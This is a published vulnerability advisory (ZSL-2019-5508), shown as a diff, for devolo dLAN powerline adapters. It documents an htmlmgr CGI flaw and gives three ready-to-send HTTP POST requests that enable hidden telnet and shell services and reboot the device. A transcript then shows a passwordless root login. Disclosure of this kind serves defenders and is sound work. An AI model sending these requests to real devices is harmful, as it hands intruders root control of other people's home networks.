@@ -1,0 +1,86 @@
+devolo dLAN 550 duo+ Starter Kit Remote Code Execution
+
+
+Vendor: devolo AG
+Product web page: https://www.devolo.com
+Affected version: dLAN 500 AV Wireless+ 3.1.0-1 (i386)
+
+Summary: Devolo dLAN® 550 duo+ Starter Kit is Powerlineadapter which is
+a cost-effective and helpful networking alternative for any location
+without structured network wiring. Especially in buildings or residences
+lacking network cables or where updating the wiring would be expensive
+and complicated, Powerline adapters provide networking at high transmission
+rates.
+
+Desc: The devolo firmware has what seems to be a 'hidden' services which
+can be enabled by authenticated attacker via the the htmlmgr CGI script.
+This allows the attacker to start services that are deprecated or discontinued
+and achieve remote arbitrary code execution with root privileges.
+
+Tested on: Linux 2.6.31
+
+
+Vulnerability discovered by Stefan Petrushevski aka sm
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5508
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5508.php
+
+
+04.10.2017
+
+--
+
+The htmlmgr cgi script that is accessible via web, does not validate or sanitize
+the configuration parameters that a user wants to change. This allows an attacker
+to change configuration parametersincluding parameters that are not even shown in
+the web administration panel.
+
+One service that is possible for an attacker to enable is telnet and remote maintenance
+shell service and then proceed to login in with the 'root' user which doesn't have a password.
+
+In order for an attacker to achieve this, he would need to change the following two values:
+System.Baptization.Telnetd  <- to enable telnet
+System.Baptization.shell  	<- to enable remote maintenance shell
+
+--------
+POST /cgi-bin/htmlmgr HTTP/1.1
+Host: DEVOLO-IP
+
+%3Asys%3ASystem.Baptization.Telnetd=1&_okdir=spec&_okpage=result&_okfollowdir=status&_okfollowpage=wireless&_okplain=1&_oktype=wlanstatus&_file=%2Fwgl%2Fmain.wgl&_style=std&_lang=&_dir=wireless&_page=wps&_idx=&_sid=&_csrf=
+--------
+
+--------
+POST /cgi-bin/htmlmgr HTTP/1.1
+Host: DEVOLO-IP
+
+%3Asys%3ASystem.Baptization.shell=1&_okdir=spec&_okpage=result&_okfollowdir=status&_okfollowpage=wireless&_okplain=1&_oktype=wlanstatus&_file=%2Fwgl%2Fmain.wgl&_style=std&_lang=&_dir=wireless&_page=wps&_idx=&_sid=&_csrf=
+--------
+
+Since the configuration is read from a file on boot time, an attacker would also
+need to somehow make the device to restart. This can be done by issuing the 'reboot'
+command again from the html cgi script: System.Reboot
+
+--------
+POST /cgi-bin/htmlmgr HTTP/1.1
+Host: DEVOLO-IP
+
+%3Asys%3ASystem.Reboot=OLACANYOUREBOOT&_okdir=spec&_okpage=result&_okfollowdir=status&_okfollowpage=wireless&_okplain=1&_oktype=wlanstatus&_file=%2Fwgl%2Fmain.wgl&_style=std&_lang=&_dir=wireless&_page=wps&_idx=&_sid=&_csrf=
+--------
+
+After the reboot the devolo device will have a telnet service on TCP port 23 opened
+and an attacker can now login to the device with user 'root' and no password.
+
+--------
+Trying DEVOLO-IP...
+Connected to DEVOLO-IP.
+Escape character is '^]'.
+
+dlanwireless login: root
+# whoami
+root
+# 
+--------
+
+The attacker then has complete access over the device. t00t.
